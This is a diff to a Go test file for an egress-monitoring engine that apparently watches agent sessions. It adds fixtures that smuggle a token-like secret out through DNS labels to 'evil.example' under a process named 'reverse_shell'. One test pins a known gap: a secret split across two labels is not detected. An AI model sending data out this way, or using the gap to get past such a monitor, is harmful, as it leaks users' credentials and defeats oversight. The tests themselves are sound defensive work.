@@ -88,6 +88,54 @@ func TestEgressReassembly_WriteFragmentsSameDestination_EXFIL(t *testing.T) {
 	}
 }
 
+// Review #16: a secret in a non-leading DNS label must still be scanned; the
+// first-label reassembly window is an addition to the raw query, not a
+// replacement for it.
+func TestEgressReassembly_DNSSecretAfterJunkLabel_EXFIL(t *testing.T) {
+	eng, _ := newTestEngine("block")
+	sid := "egress-dns-junk-label"
+	secret := "sk-live-51TxJANEd0eR3aLt0k3n9876543210abcdef"
+	eng.IngestResult(makeResultEvent(sid, "read_ticket", "tickets", 1,
+		`{"content":[{"type":"text","text":"Token: `+secret+`"}]}`))
+
+	dec := eng.IngestSyscall(model.SyscallEvent{
+		SessionID:      sid,
+		Syscall:        "dns",
+		DestIP:         "8.8.8.8",
+		DestPort:       53,
+		PID:            7704,
+		Comm:           "reverse_shell",
+		PayloadExcerpt: "junk." + secret + ".evil.example",
+	})
+	if dec.Verdict != model.VerdictExfil {
+		t.Fatalf("secret in second DNS label must trip EXFIL, got %q", dec.Verdict)
+	}
+}
+
+// A secret split across labels of one query ("<a>.<b>.evil.example") is not
+// joined: the raw query keeps its dots and only the first label feeds
+// cross-query reassembly.
+func TestEgressReassembly_DNSSecretSplitAcrossLabels_KnownGap(t *testing.T) {
+	eng, _ := newTestEngine("block")
+	sid := "egress-dns-label-split"
+	secret := "sk-live-51TxJANEd0eR3aLt0k3n9876543210abcdef"
+	eng.IngestResult(makeResultEvent(sid, "read_ticket", "tickets", 1,
+		`{"content":[{"type":"text","text":"Token: `+secret+`"}]}`))
+
+	dec := eng.IngestSyscall(model.SyscallEvent{
+		SessionID:      sid,
+		Syscall:        "dns",
+		DestIP:         "8.8.8.8",
+		DestPort:       53,
+		PID:            7704,
+		Comm:           "reverse_shell",
+		PayloadExcerpt: secret[:20] + "." + secret[20:] + ".evil.example",
+	})
+	if dec.Verdict == model.VerdictExfil {
+		t.Fatal("label-split secret now caught: gap closed, flip this pin")
+	}
+}
+
 func TestEgressReassembly_CrossDestinationSplit_KnownGap(t *testing.T) {
 	eng, _ := newTestEngine("block")
 	sid := "egress-reassembly-cross-dest"
